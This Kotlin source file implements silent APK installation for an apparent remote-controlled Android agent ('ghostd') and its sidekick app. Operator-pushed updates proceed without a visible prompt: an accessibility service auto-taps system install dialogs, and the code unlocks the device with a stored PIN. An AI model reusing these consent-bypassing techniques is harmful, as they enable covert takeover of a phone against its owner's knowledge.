package com.tg.ghostd

import android.app.KeyguardManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageInfo
import android.os.Build
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import java.util.concurrent.locks.ReentrantLock
import kotlin.concurrent.withLock

/**
 * Silent auto-update for ghostd (`update self`) and the sidekick ghosta
 * (`update sidekick`).
 *
 * FLOW:
 *   1. Operator pushes the APK:  files put /sdcard/Download/ghostd.apk
 *      — OR just runs `update self` / `update sidekick` with no path: the
 *      command then first RECEIVES the APK via the files-put flow (server
 *      streams it, FileReceiver writes + sha256-verifies) and continues
 *      once the transfer completes.
 *   2. Install via PackageInstaller (REQUEST_INSTALL_PACKAGES is in the
 *      manifest). SILENT path:
 *        - self-update: same-signature update of our own package; on API
 *          31+ we pass SessionParams.setRequireUserAction(
 *          USER_ACTION_NOT_REQUIRED). Below 31 the system already proceeds
 *          without a prompt for same-signature updates initiated by the app
 *          holding REQUEST_INSTALL_PACKAGES.
 *        - sidekick: ghostd is the installer-of-record once it installed
 *          com.tg.ghosta the first time (SidekickInstaller flow), so its
 *          UPDATES install silently the same way.
 *   3. FALLBACK (not installer-of-record, or OEM insists): the system
 *      reports STATUS_PENDING_USER_ACTION — we launch the system confirm
 *      dialog and the ARMED sidekick auto-taps "Install"
 *      (GhostAccessibilityService.CONFIRM_TEXTS), so it still completes
 *      hands-free.
 *   4. The command BLOCKS until the final install status for ITS OWN session
 *      and reports it to the server BEFORE the WebSocket drops: for `update
 *      self` a successful install restarts the service (process is killed
 *      by the package replace), so the response includes a "rebooting
 *      connection" note and the reconnect after restart carries the new
 *      versionName in the registration message.
 *
 * Callback scoping: each install gets a random per-session broadcast action,
 * registers a NOT_EXPORTED receiver (API 33+; the random action plus the
 * sender-permission-free dynamic receiver is the equivalent protection on
 * older APIs), and accepts a status only when EXTRA_SESSION_ID matches the
 * session it created (and EXTRA_PACKAGE_NAME, when present, matches the
 * expected package). A single process-wide lock serializes ghostd-installed
 * sessions, so bundled provisioning and an operator command can overlap
 * without consuming each other's result.
 *
 * Versioning: versionName is display metadata only. Install ordering and
 * post-install verification use longVersionCode. The archive package is
 * compared with the requested target before a session is committed.
 */
object AppUpdater {

    /** Default files-put destination for the ghostd self-update APK. */
    const val DEFAULT_SELF_APK_PATH = "/sdcard/Download/ghostd.apk"

    /** Sidekick package (client-sidekick). */
    const val SIDEKICK_PACKAGE = "com.tg.ghosta"

    private const val ACTION_STATUS_PREFIX = "com.tg.ghostd.UPDATE_STATUS"

    /** Wait for the final install status (incl. time to auto-tap a dialog). */
    private const val STATUS_TIMEOUT_MS = 120_000L

    /** How long the PackageManager may take to expose the new version. */
    private const val VERIFY_TIMEOUT_MS = 3_000L

    /**
     * One PackageInstaller session at a time per process. PackageInstaller
     * status callbacks are already scoped by action + session id, but
     * serializing sessions also keeps bundled provisioning and an operator
     * install from racing each other (and from staging two full APK copies).
     * It is reentrant so [SidekickInstaller.provisionBundled] can hold the
     * lock across extract+compare+install.
     */
    private val INSTALL_LOCK = ReentrantLock(true)

    /** Run [block] while holding the process-wide install lock. */
    internal fun <T> withInstallLock(block: () -> T): T = INSTALL_LOCK.withLock(block)

    // -------------------------------------------------------------- versions

    fun currentVersionName(ctx: Context): String = try {
        ctx.packageManager.getPackageInfo(ctx.packageName, 0).versionName ?: "?"
    } catch (_: Exception) {
        "?"
    }

    /** Installed versionName of [pkg], or null when not installed. */
    fun installedVersionName(ctx: Context, pkg: String): String? = try {
        ctx.packageManager.getPackageInfo(pkg, 0).versionName
    } catch (_: Exception) {
        null
    }

    /** Installed longVersionCode of [pkg], or null when not installed. */
    fun installedVersionCode(ctx: Context, pkg: String): Long? = try {
        longVersionCode(ctx.packageManager.getPackageInfo(pkg, 0))
    } catch (_: Exception) {
        null
    }

    /** versionName inside a (pushed) APK file, or null when unreadable. */
    fun apkVersionName(ctx: Context, apkPath: String): String? = try {
        archiveInfo(ctx, apkPath)?.versionName
    } catch (_: Exception) {
        null
    }

    /** longVersionCode inside a (pushed) APK file, or null when unreadable. */
    fun apkVersionCode(ctx: Context, apkPath: String): Long? = try {
        archiveInfo(ctx, apkPath)?.let { longVersionCode(it) }
    } catch (_: Exception) {
        null
    }

    /** True when [pkg] was installed by ghostd (installer-of-record). */
    fun isInstallerOfRecord(ctx: Context, pkg: String): Boolean = try {
        if (Build.VERSION.SDK_INT >= 30) {
            ctx.packageManager.getInstallSourceInfo(pkg)
                .installingPackageName == ctx.packageName
        } else {
            @Suppress("DEPRECATION")
            ctx.packageManager.getInstallerPackageName(pkg) == ctx.packageName
        }
    } catch (_: Exception) {
        false
    }

    // ---------------------------------------------------------------- update

    /** `update self [apk_path]` — silent same-signature self-update. */
    fun updateSelf(ctx: Context, apkPath: String?): JSONObject {
        val path = resolveApk(apkPath, DEFAULT_SELF_APK_PATH)
        val oldVersion = currentVersionName(ctx)
        val oldCode = installedVersionCode(ctx, ctx.packageName)
        val newVersion = apkVersionName(ctx, path) ?: "?"
        val newCode = apkVersionCode(ctx, path)
        val unlocked = ensureUnlocked(ctx)
        val res = installApk(
            ctx, path,
            expectedPackage = ctx.packageName,
            requireNoUserAction = true,   // same-signature self-update
            sessionName = "ghostd"
        )
        res.put("target", "self")
            .put("old_version", oldVersion)
            .put("old_version_code", oldCode ?: -1L)
            .put("new_version", newVersion)
            .put("new_version_code", newCode ?: -1L)
            .put("keyguard_unlocked", unlocked)
        if (res.optString("status") == "installed") {
            res.put(
                "note",
                "update installed ($oldVersion -> $newVersion); rebooting connection — service restarts after install"
            )
        }
        return res
    }

    /**
     * `update sidekick [apk_path]` — silent when ghostd is the
     * installer-of-record for com.tg.ghosta (i.e. after the first install
     * ghostd performed); otherwise the existing confirm+auto-tap flow.
     */
    fun updateSidekick(ctx: Context, apkPath: String?): JSONObject {
        val path = resolveApk(apkPath, SidekickInstaller.DEFAULT_APK_PATH)
        val oldVersion = installedVersionName(ctx, SIDEKICK_PACKAGE) ?: "not installed"
        val oldCode = installedVersionCode(ctx, SIDEKICK_PACKAGE)
        val newVersion = apkVersionName(ctx, path) ?: "?"
        val newCode = apkVersionCode(ctx, path)
        val installerOfRecord = isInstallerOfRecord(ctx, SIDEKICK_PACKAGE)
        val unlocked = ensureUnlocked(ctx)
        val res = if (installerOfRecord) {
            // We installed ghosta before: silent update, same as self.
            installApk(
                ctx, path,
                expectedPackage = SIDEKICK_PACKAGE,
                requireNoUserAction = true,
                sessionName = "ghosta"
            )
        } else {
            // First install / different installer: confirm dialog + the armed
            // sidekick auto-taps Install (existing SidekickInstaller flow).
            SidekickInstaller.install(ctx, path)
        }
        return res.put("target", "sidekick")
            .put("old_version", oldVersion)
            .put("old_version_code", oldCode ?: -1L)
            .put("new_version", newVersion)
            .put("new_version_code", newCode ?: -1L)
            .put("installer_of_record", installerOfRecord)
            .put("keyguard_unlocked", unlocked)
    }

    /**
     * Make sure the screen is on and the keyguard is gone before an install.
     *
     * Android suppresses the PackageInstaller confirmation sheet while the
     * device is locked, which is exactly what made earlier updates appear to
     * "hang with no dialog". We reuse the PIN remembered by an earlier
     * `unlock` (Keystore-encrypted), so a later update is fully hands-free.
     * No-op — never blocking an update — when no PIN is stored.
     *
     * @return true when the device is unlocked after this call
     */
    fun ensureUnlocked(ctx: Context): Boolean {
        val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
            ?: return true
        try {
            if (!km.isKeyguardLocked && !km.isDeviceLocked) return true
            if (!Prefs.hasPin(ctx)) return false
            val res = CommandHandler.unlockWithStoredPin(ctx)
            if (!res.optBoolean("ok")) {
                return !km.isKeyguardLocked && !km.isDeviceLocked
            }
            for (i in 0 until 20) {          // up to 10s for the keyguard to go
                if (!km.isKeyguardLocked && !km.isDeviceLocked) return true
                Thread.sleep(500)
            }
        } catch (_: Exception) {
        }
        return false
    }

    // ---------------------------------------------------------------- install

    /**
     * Install [apkPath] via PackageInstaller and BLOCK until the final
     * status for this session arrives (success or failure). If the system
     * requires user action, the confirm dialog is launched and we keep
     * waiting — the armed sidekick auto-taps it.
     *
     * The APK archive must declare [expectedPackage], otherwise nothing is
     * staged. [requireNoUserAction] passes USER_ACTION_NOT_REQUIRED (API
     * 31+) so same-signature / installer-of-record installs proceed
     * silently. The session is also constrained to [expectedPackage] with
     * SessionParams.setAppPackageName, and the installed longVersionCode is
     * verified before success is returned.
     *
     * Returns {"apk","size","status":"installed","package","version_code",
     * "silent",...} on success; throws on failure/timeout. A timeout after
     * commit is reported as committed-and-may-still-complete, never as a
     * cancellation.
     */
    fun installApk(
        ctx: Context,
        apkPath: String,
        expectedPackage: String,
        requireNoUserAction: Boolean,
        sessionName: String
    ): JSONObject {
        val f = File(apkPath)
        if (!f.exists() || !f.isFile || f.length() == 0L) {
            throw Exception("apk not found at $apkPath — push it first: files put $apkPath")
        }
        INSTALL_LOCK.lock()
        try {
            // Reject unreadable/wrong-package archives BEFORE creating a
            // session, so a swapped ghosta/ghostd APK can never be committed
            // as the other target. Holding the lock also keeps the file from
            // being replaced by another provisioning path while we stage it.
            // (Android still enforces signature compatibility itself.)
            val apk = readArchiveIdentity(ctx, f, expectedPackage)
            return installLocked(
                ctx, f, apk, expectedPackage, requireNoUserAction, sessionName
            )
        } finally {
            INSTALL_LOCK.unlock()
        }
    }

    private fun installLocked(
        ctx: Context,
        f: File,
        apk: ApkIdentity,
        expectedPackage: String,
        requireNoUserAction: Boolean,
        sessionName: String
    ): JSONObject {
        val installer = ctx.packageManager.packageInstaller
        val events = LinkedBlockingQueue<Intent>()
        var sessionId = -1
        var session: PackageInstaller.Session? = null
        var receiver: BroadcastReceiver? = null
        var receiverRegistered = false
        var committed = false
        try {
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )
            params.setSize(f.length())
            // "Optionally set the package name of the app being installed."
            // If the staged APKs disagree, the install fails — a second
            // barrier after readArchiveIdentity, enforced by the platform.
            params.setAppPackageName(expectedPackage)
            if (requireNoUserAction && Build.VERSION.SDK_INT >= 31) {
                // API 31+: request a SILENT install. Honored for
                // same-signature self-updates and packages we are the
                // installer of record for. Below 31 the system generally
                // skips the prompt for those anyway.
                params.setRequireUserAction(
                    PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED
                )
            }

            sessionId = try {
                installer.createSession(params)
            } catch (e: Exception) {
                throw Exception(
                    "install: could not create PackageInstaller session for $expectedPackage: ${e.message}", e
                )
            }
            val ownedSessionId = sessionId

            // The action is unguessable and unique to this attempt. On API
            // 33+ the receiver is NOT_EXPORTED, so only our own app (the
            // PendingIntent creator identity) can deliver to it. On older
            // APIs dynamic filters cannot be unexported without a manifest
            // permission, so the random action plus the strict session-id
            // check below provide the same "not addressable by others"
            // property without adding a manifest permission.
            val action = "$ACTION_STATUS_PREFIX.${UUID.randomUUID()}"

            receiver = object : BroadcastReceiver() {
                override fun onReceive(c: Context, i: Intent) {
                    val sid = i.getIntExtra(PackageInstaller.EXTRA_SESSION_ID, -1)
                    val pkg = i.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                    if (VersionInfo.statusBelongsTo(
                            ownedSessionId, expectedPackage, sid, pkg
                        )
                    ) {
                        events.offer(i)
                    }
                }
            }
            try {
                registerStatusReceiver(ctx, receiver, action)
                receiverRegistered = true
            } catch (e: Exception) {
                throw Exception(
                    "install: could not register status receiver for session $ownedSessionId: ${e.message}", e
                )
            }

            try {
                session = installer.openSession(ownedSessionId)
            } catch (e: Exception) {
                throw Exception(
                    "install: could not open session $ownedSessionId for $expectedPackage: ${e.message}", e
                )
            }
            val opened = session
                ?: throw Exception("install: null session $ownedSessionId")
            // Defense in depth: the platform echoes the package name set on
            // the params. getSessionInfo is advisory; the archive identity
            // check above remains the authoritative pre-commit gate.
            val bound = try {
                installer.getSessionInfo(ownedSessionId)?.appPackageName
            } catch (_: Exception) {
                null
            }
            if (bound != null && bound != expectedPackage) {
                throw Exception(
                    "install: session $ownedSessionId is bound to '$bound', expected '$expectedPackage'"
                )
            }
            try {
                f.inputStream().use { input ->
                    opened.openWrite(sessionName, 0, f.length()).use { out ->
                        input.copyTo(out)
                        opened.fsync(out)
                    }
                }
            } catch (e: Exception) {
                throw Exception(
                    "install: could not stage $expectedPackage (session $ownedSessionId): ${e.message}", e
                )
            }

            val status = PendingIntent.getBroadcast(
                ctx, ownedSessionId,
                Intent(action).setPackage(ctx.packageName),
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            try {
                session.commit(status.intentSender)
            } catch (e: Exception) {
                throw Exception(
                    "install: commit failed for $expectedPackage (session $ownedSessionId): ${e.message}", e
                )
            }
            committed = true
            try {
                session.close()
            } catch (_: Exception) {
            }
            session = null

            return awaitInstallResult(
                ctx, f, apk, expectedPackage, ownedSessionId, events
            )
        } finally {
            if (receiverRegistered) {
                try {
                    receiver?.let { ctx.unregisterReceiver(it) }
                } catch (_: Exception) {
                }
            }
            try {
                session?.close()
            } catch (_: Exception) {
            }
            if (!committed && sessionId >= 0) {
                // An uncommitted session holds a partially staged APK until
                // it is abandoned; close() alone only releases the handle.
                try {
                    installer.abandonSession(sessionId)
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun awaitInstallResult(
        ctx: Context,
        f: File,
        apk: ApkIdentity,
        expectedPackage: String,
        sessionId: Int,
        events: LinkedBlockingQueue<Intent>
    ): JSONObject {
        var sawDialog = false
        val deadline = System.currentTimeMillis() + STATUS_TIMEOUT_MS
        while (true) {
            val remaining = deadline - System.currentTimeMillis()
            var interrupted = false
            val i = if (remaining <= 0) {
                null
            } else {
                try {
                    events.poll(remaining, TimeUnit.MILLISECONDS)
                } catch (_: InterruptedException) {
                    interrupted = true
                    Thread.currentThread().interrupt()
                    null
                }
            }
            if (i == null) {
                // The session is committed: Android owns it now. We may have
                // missed the callback (e.g. an OEM broadcast quirk) while the
                // install actually completed, so verify the package state.
                val installed = installedVersionCode(ctx, expectedPackage)
                if (VersionInfo.installedMatches(apk.versionCode, installed)) {
                    return installedResult(
                        f, apk, expectedPackage, sawDialog,
                        "install status was not received; verified " +
                            "$expectedPackage versionCode ${apk.versionCode} installed"
                    )
                }
                val what = if (interrupted) {
                    "install status wait interrupted"
                } else {
                    "install status timeout after ${STATUS_TIMEOUT_MS / 1000}s"
                }
                throw Exception(
                    "$what (session $sessionId, package $expectedPackage); " +
                        "the session was committed and may still complete — it was NOT cancelled " +
                        "(installed versionCode ${installed ?: "not installed"}, " +
                        "expected ${apk.versionCode})"
                )
            }

            when (i.getIntExtra(
                PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE
            )) {
                PackageInstaller.STATUS_SUCCESS -> {
                    if (!awaitInstalled(
                            ctx, expectedPackage, apk.versionCode, VERIFY_TIMEOUT_MS
                        )
                    ) {
                        val installed = installedVersionCode(ctx, expectedPackage)
                        throw Exception(
                            "install reported success but $expectedPackage is at " +
                                "versionCode ${installed ?: "not installed"}, expected " +
                                "${apk.versionCode}; refusing to report an unverified install"
                        )
                    }
                    return installedResult(
                        f, apk, expectedPackage, sawDialog,
                        if (sawDialog)
                            "installed after confirm dialog (sidekick auto-tap)"
                        else "installed silently"
                    )
                }
                PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                    // Not silent: launch the system confirm dialog; the
                    // armed sidekick auto-taps "Install". The event was
                    // accepted only after the session/package match above,
                    // so this nested intent comes from our own session.
                    sawDialog = true
                    val confirm = confirmationIntent(i)
                    if (confirm != null) {
                        try {
                            ctx.startActivity(
                                Intent(confirm).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            )
                        } catch (_: Exception) {
                            // dialog may already be up; keep waiting
                        }
                    }
                }
                else -> {
                    val status = i.getIntExtra(
                        PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE
                    )
                    val msg = i.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: ""
                    throw Exception("install failed (status $status): $msg")
                }
            }
        }
    }

    private fun installedResult(
        f: File,
        apk: ApkIdentity,
        expectedPackage: String,
        sawDialog: Boolean,
        note: String
    ): JSONObject = JSONObject()
        .put("apk", f.absolutePath)
        .put("size", f.length())
        .put("status", "installed")
        .put("package", expectedPackage)
        .put("version_code", apk.versionCode)
        .put("version_name", apk.versionName ?: "?")
        .put("silent", !sawDialog)
        .put("note", note)

    private fun registerStatusReceiver(
        ctx: Context,
        receiver: BroadcastReceiver,
        action: String
    ) {
        val filter = IntentFilter(action)
        if (Build.VERSION.SDK_INT >= 33) {
            ctx.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            ctx.registerReceiver(receiver, filter)
        }
    }

    private fun confirmationIntent(i: Intent): Intent? =
        if (Build.VERSION.SDK_INT >= 33) {
            i.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            i.getParcelableExtra(Intent.EXTRA_INTENT)
        }

    private fun awaitInstalled(
        ctx: Context,
        pkg: String,
        expectedCode: Long,
        timeoutMs: Long
    ): Boolean {
        val deadline = System.currentTimeMillis() + timeoutMs
        while (true) {
            if (VersionInfo.installedMatches(
                    expectedCode, installedVersionCode(ctx, pkg)
                )
            ) {
                return true
            }
            if (System.currentTimeMillis() >= deadline) return false
            try {
                Thread.sleep(100)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return VersionInfo.installedMatches(
                    expectedCode, installedVersionCode(ctx, pkg)
                )
            }
        }
    }

    // -------------------------------------------------------------- internal

    private data class ApkIdentity(
        val packageName: String,
        val versionCode: Long,
        val versionName: String?
    )

    /**
     * Read and validate the archive identity. Rejects an unreadable APK and
     * an APK whose manifest package differs from [expectedPackage].
     */
    private fun readArchiveIdentity(
        ctx: Context,
        f: File,
        expectedPackage: String
    ): ApkIdentity {
        val info = try {
            archiveInfo(ctx, f.absolutePath)
        } catch (e: Exception) {
            throw Exception(
                "update: cannot read APK at ${f.absolutePath}: ${e.message}", e
            )
        } ?: throw Exception(
            "update: cannot read APK identity at ${f.absolutePath}"
        )
        val pkg = info.packageName
            ?: throw Exception("update: APK at ${f.absolutePath} has no package name")
        if (!VersionInfo.archivePackageMatches(expectedPackage, pkg)) {
            throw Exception(
                "update: APK package '$pkg' does not match expected " +
                    "'$expectedPackage' (${f.absolutePath}); refusing to install the wrong target"
            )
        }
        return ApkIdentity(pkg, longVersionCode(info), info.versionName)
    }

    @Suppress("DEPRECATION")
    private fun archiveInfo(ctx: Context, apkPath: String): PackageInfo? =
        ctx.packageManager.getPackageArchiveInfo(apkPath, 0)

    private fun longVersionCode(info: PackageInfo): Long =
        if (Build.VERSION.SDK_INT >= 28) {
            info.longVersionCode
        } else {
            @Suppress("DEPRECATION")
            info.versionCode.toLong()
        }

    /**
     * Resolve the APK path for an update command: an explicit [apkPath] is
     * used as-is; when absent, first RECEIVE the APK via the files-put
     * flow (server pushes it; blocks until the sha256-verified transfer
     * completes — see FileReceiver).
     */
    private fun resolveApk(apkPath: String?, defaultPath: String): String {
        if (!apkPath.isNullOrBlank()) return apkPath
        // The daemon pushes first and then passes the destination explicitly.
        // Accept an already-pushed default for direct/manual commands, but do
        // NOT open a second receive here: that used to wait for a nonexistent
        // second upload after the daemon's push had already completed.
        if (File(defaultPath).isFile) return defaultPath
        throw Exception("update: APK not found at $defaultPath; push it first")
    }
}
